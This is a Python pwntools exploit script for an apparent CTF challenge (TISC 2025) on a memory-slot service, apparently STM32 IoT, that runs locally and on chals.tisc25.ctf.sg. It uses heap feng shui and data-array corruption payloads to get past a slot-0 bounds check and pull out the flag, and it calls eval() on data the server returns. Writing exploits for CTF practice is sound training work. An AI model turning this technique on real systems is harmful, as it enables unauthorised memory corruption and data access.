#!/usr/bin/env python3

import json
import socket
import time
from pwn import *

def heap_feng_shui_setup(host, port):
    """Set up heap feng shui with slot 1 comparison [69,2,0]"""
    try:
        r = remote(host, port)
        # Heap feng shui: start with slot 1 comparison to set up heap layout
        feng_shui_cmd = {"slot": 1, "data": [69, 2, 0]}
        cmd_str = json.dumps(feng_shui_cmd)
        print(f"Heap feng shui setup: {cmd_str}")
        r.sendline(cmd_str.encode())
        response = r.recv()
        print(f"Feng shui response: {response}")
        return r
    except Exception as e:
        print(f"Heap feng shui setup failed: {e}")
        return None

def exploit_data_array_corruption():
    """Focus on data array corruption that changes slot 0 behavior"""
    print("=== FOCUSING ON DATA ARRAY CORRUPTION ===")
    
    # We observed that data arrays cause slot 0 to return "Checking..." instead of "Out of bounds!"
    # This means we're corrupting the slot access logic somehow
    # Let's try different data array patterns to trigger the full bypass
    
    # Patterns that might cause the corruption to fully bypass the check
    patterns = []
    
    # Pattern 1: Try to corrupt with specific values that might overwrite slot number check
    for size in [10, 20, 30, 50, 100]:
        patterns.append(("Sequential", size, list(range(size))))
        patterns.append(("Zeros", size, [0] * size))
        patterns.append(("Ones", size, [1] * size))
        patterns.append(("Max bytes", size, [255] * size))
        patterns.append(("Pattern ABCD", size, [0x41, 0x42, 0x43, 0x44] * (size//4 + 1)))
    
    # Pattern 2: Try specific values that might corrupt slot validation
    # Based on the unsigned arithmetic: 0xe < iStack_10c - 1U
    # We want to make iStack_10c = 1 so that 0xe < 0 (which is 0xffffffff unsigned)
    corruption_values = [
        [1],  # Direct attempt to set slot to 1 
        [0, 1],  # Set to 0, then 1
        [0] * 50 + [1],  # Pad with zeros then 1
        [255] * 10 + [0],  # Try to corrupt then set to 0
        [69, 2, 0, 0, 0, 0, 0, 0, 1],  # Our feng shui pattern + attempt to set slot to 1
    ]
    
    all_patterns = patterns + [("Corruption attempt", len(cv), cv) for cv in corruption_values]
    
    for pattern_name, size, data in all_patterns:
        print(f"\n--- Testing {pattern_name} (size {size}) ---")
        
        r = heap_feng_shui_setup('localhost', 8000)
        if not r:
            continue
            
        try:
            # Send the corruption payload
            corruption_cmd = {"slot": 1, "data": data}
            cmd_str = json.dumps(corruption_cmd)
            
            print(f"Sending corruption payload...")
            r.sendline(cmd_str.encode())
            response = r.recv(timeout=5)
            print(f"Corruption response: {response}")
            
            # Now test slot 0 multiple times with different approaches
            test_commands = [
                '{"slot":0}',
                '{"slot": 0}',  # With space
                '{"slot":0,"data":[]}',  # With empty data
                '{"slot":0, "data": [69,2,0]}',  # With our feng shui data
            ]
            
            success = False
            for i, test_cmd in enumerate(test_commands):
                print(f"Testing slot 0 variant {i+1}: {test_cmd}")
                r.sendline(test_cmd.encode())
                slot0_response = r.recv(timeout=3)
                print(f"Slot 0 response {i+1}: {slot0_response}")
                
                if b'TISC{' in slot0_response:
                    print(f"🎉 SUCCESS! Found flag with {pattern_name}!")
                    print(f"Flag: {slot0_response}")
                    r.close()
                    return True
                elif b'Slot 0 contains:' in slot0_response:
                    print(f"🎉 SUCCESS! Got slot 0 contents with {pattern_name}!")
                    print(f"Content: {slot0_response}")
                    # Convert the array to text
                    try:
                        # Extract the array from the response
                        if b'[' in slot0_response and b']' in slot0_response:
                            array_start = slot0_response.index(b'[')
                            array_end = slot0_response.index(b']') + 1
                            array_str = slot0_response[array_start:array_end].decode()
                            array_values = eval(array_str)  # Parse the array
                            flag = ''.join(chr(x) for x in array_values if x != 0)
                            print(f"🚩 Decoded flag: {flag}")
                    except:
                        pass
                    r.close()
                    return True
                elif b'Out of bounds!' not in slot0_response and b'Unknown command' not in slot0_response:
                    print(f"⚠️  Different behavior: {slot0_response}")
                    
                time.sleep(0.1)
                
        except Exception as e:
            print(f"Error with {pattern_name}: {e}")
        finally:
            r.close()
            
        time.sleep(0.2)
    
    return False

def try_remote_server():
    """Try the exploit against the remote server"""
    print("\n=== TRYING AGAINST REMOTE SERVER ===")
    
    try:
        print("Connecting to remote server: chals.tisc25.ctf.sg:51728")
        r = remote('chals.tisc25.ctf.sg', 51728)
        
        # Set up heap feng shui on remote
        feng_shui_cmd = {"slot": 1, "data": [69, 2, 0]}
        cmd_str = json.dumps(feng_shui_cmd)
        print(f"Remote feng shui: {cmd_str}")
        r.sendline(cmd_str.encode())
        response = r.recv()
        print(f"Remote feng shui response: {response}")
        
        # Try the most promising data array corruption
        # Use the pattern that showed different behavior locally
        corruption_cmd = {"slot": 1, "data": list(range(100))}
        cmd_str = json.dumps(corruption_cmd)
        
        print("Sending corruption payload to remote...")
        r.sendline(cmd_str.encode())
        response = r.recv(timeout=5)
        print(f"Remote corruption response: {response}")
        
        # Test slot 0 on remote
        print("Testing slot 0 on remote...")
        r.sendline(b'{"slot":0}')
        slot0_response = r.recv(timeout=5)
        print(f"Remote slot 0 response: {slot0_response}")
        
        if b'TISC{' in slot0_response:
            print(f"🎉 REMOTE SUCCESS! Flag: {slot0_response}")
            return True
        elif b'Slot 0 contains:' in slot0_response:
            print(f"🎉 REMOTE SUCCESS! Content: {slot0_response}")
            return True
            
        r.close()
        
    except Exception as e:
        print(f"Remote connection failed: {e}")
    
    return False

def main():
    print("🎯 FINAL STM32 IoT Heap Exploitation Attempt")
    print("Targeting data array corruption that changes slot 0 behavior")
    
    # Focus on the data array corruption we observed
    success = exploit_data_array_corruption()
    
    if success:
        print("\n🎉 LOCAL EXPLOITATION SUCCESSFUL!")
        
        # If local worked, try remote
        remote_success = try_remote_server() 
        if remote_success:
            print("\n🎉🎉 REMOTE EXPLOITATION SUCCESSFUL! FLAG CAPTURED! 🎉🎉")
        else:
            print("\n⚠️  Local worked but remote failed. May need adaptation.")
    else:
        print("\n❌ Local exploitation failed.")
        
        # Try remote anyway in case local/remote behavior differs
        print("\n🔄 Trying remote server anyway...")
        remote_success = try_remote_server()
        if remote_success:
            print("\n🎉 REMOTE SUCCESS despite local failure!")

if __name__ == "__main__":
    main()